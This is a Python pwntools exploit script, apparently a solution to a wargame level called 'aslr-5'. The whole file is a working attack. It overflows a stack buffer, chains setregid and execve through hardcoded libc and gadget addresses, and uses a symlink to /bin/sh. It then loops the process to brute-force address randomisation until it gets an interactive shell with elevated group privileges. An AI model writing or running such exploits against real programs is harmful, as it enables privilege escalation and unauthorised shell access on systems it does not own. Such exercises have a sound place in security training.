#!/usr/bin/env python

from pwn import *
import os

#p = process("./aslr-5")

# [buffer] [saved ebp]
buf = "A" * 0x88 + "BBBB"

"""
 0xb7ece5f0 <__setregid>
 0xb7e9f7e0 <execve>
"""

execve = p32(0xb7e9f7e0)
setregid = p32(0xb7ece5f0)

"""
0x080485bb : pop ebp ; ret
0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048329 : pop ebx ; ret
0x08048551 : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x080485ba : pop edi ; pop ebp ; ret
0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
"""

pop_pop_ret = p32(0x080485ba)

buf += setregid
buf += pop_pop_ret
buf += p32(50411)
buf += p32(50411)

string = p32(0x8048034)
if os.path.exists("\x06"):
    os.unlink("\x06")
os.symlink("/bin/sh", "\x06");

buf += execve
buf += p32(0)
buf += string
buf += p32(0)
buf += p32(0)

i = 0
while True:
    p = process('./aslr-5')
    print('sending: ')
    print(buf)
    print(i)
    i=i+1
    p.sendline(buf)
    p.interactive()
    p.close()

